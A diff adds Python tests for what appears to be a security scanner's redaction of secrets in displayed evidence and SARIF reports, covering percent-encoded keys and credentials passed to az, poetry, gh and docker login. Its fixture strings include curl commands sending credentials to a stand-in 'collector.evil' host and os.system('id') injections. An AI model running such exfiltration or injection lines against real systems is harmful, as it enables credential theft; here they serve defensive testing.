@@ -2048,6 +2048,23 @@ def test_catboost_display_fails_closed_for_late_percent_encoded_secret() -> None
     assert redacted == "<redacted>"
 
 
+def test_catboost_display_fails_closed_for_percent_encoded_secret_at_segment_end() -> None:
+    evidence = ("benign_parameter%3Dvalue%3B" * 15) + "api_key%3Dhunter2"
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert redacted == "<redacted>"
+    assert _redact_reversible_percent_evidence(evidence) == "<redacted>"
+    assert "hunter2" not in redacted
+    assert "%3Dhunter2" not in redacted
+
+
+def test_catboost_display_preserves_long_benign_percent_encoding() -> None:
+    evidence = ("benign_parameter%3Dvalue%3B" * 15) + "mode%3Dfast"
+
+    assert _redact_reversible_percent_evidence(evidence) == evidence
+
+
 def test_catboost_display_preserves_generic_key_without_command_context() -> None:
     evidence = "key=feature_name; metadata=public"
 
@@ -2269,6 +2286,12 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
         "subprocess.run(['gh', 'auth', 'login', '--with-token'], input='ghinput25')",
         "subprocess.run(['curl', '--user', 'alice:curlargv26', 'https://collector.evil/upload'])",
         "subprocess.run(['curl', '--cert', 'client.pem:certargv27', 'https://collector.evil/upload'])",
+        "az login --service-principal -u app --federated-token oidcpass22 --tenant tenant",
+        "az storage blob list --account-name acct --account-key storagepass23",
+        "poetry config --local pypi-token.pypi localpoetrypass24",
+        'subprocess.run(["gh", "auth", "login", "--with-token"], input="ghpass25", text=True)',
+        "python -c 'print(\"ghpipepass26\")' | gh auth login --with-token",
+        "docker login --password-stdin < <(echo processsub28)",
         f'import os; {short_payload}; os.system("id")',
         'AWSSECRETACCESSKEY=awspass10 os.system("id")',
         f'{bytes_evidence}; os.system("id")',
@@ -2305,6 +2328,12 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
         "ghinput25",
         "curlargv26",
         "certargv27",
+        "oidcpass22",
+        "storagepass23",
+        "localpoetrypass24",
+        "ghpass25",
+        "ghpipepass26",
+        "processsub28",
     ):
         assert secret not in failed_details
         assert secret not in sarif
